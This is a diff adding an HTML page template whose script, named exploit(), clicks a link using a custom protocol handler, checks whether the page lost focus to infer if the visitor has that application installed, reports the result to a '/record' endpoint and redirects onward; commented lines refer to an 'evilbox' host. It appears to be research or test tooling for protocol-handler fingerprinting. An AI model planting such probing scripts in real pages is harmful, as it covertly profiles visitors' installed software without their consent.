@@ -1,0 +1,81 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <!--
+    Modified from the Debian original for Ubuntu
+    Last updated: 2014-03-19
+    See: https://launchpad.net/bugs/1288690
+  -->
+  <head>
+
+
+      <script
+  src="https://code.jquery.com/jquery-3.4.1.js"
+  integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+  crossorigin="anonymous"></script>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title></title>
+    <style type="text/css" media="screen">
+
+ </style>
+  </head>
+  <body>
+    <div id="link-box" style="width:200px;height: 200px;border:1px solid black;">
+        <a href="{{ handler }}://test" id="handler-link">link</a>
+    </div>
+
+
+    <script type="application/javascript">
+        $( document ).ready(function() {
+
+
+            exploit();
+            handler = "{{ handler }}";
+            test_key = "{{ test_key }}";
+
+
+            async function exploit() {
+                document.getElementById('handler-link').click();
+                await sleep(1000);
+                handler_exists = !document.hasFocus();
+
+                $.get( "/record", { "handler": handler, "is_exists": handler_exists , "test_key": test_key} );
+
+                document.location = "http://{{host}}/chrome/router?test_key=" + test_key
+
+
+            }
+
+
+
+
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+
+
+
+
+});
+     
+    //  if (window.location == "http://192.168.133.142/"){
+    //     window.location = "http://evilbox"
+
+    //  }
+    //  else if (window.location ==  "http://evilbox/") {
+    //   window.location = "http://192.168.133.142/"
+    //  }
+
+
+
+     
+
+
+     //location.reload()
+
+    </script>
+
+  </body>
+
+</html>
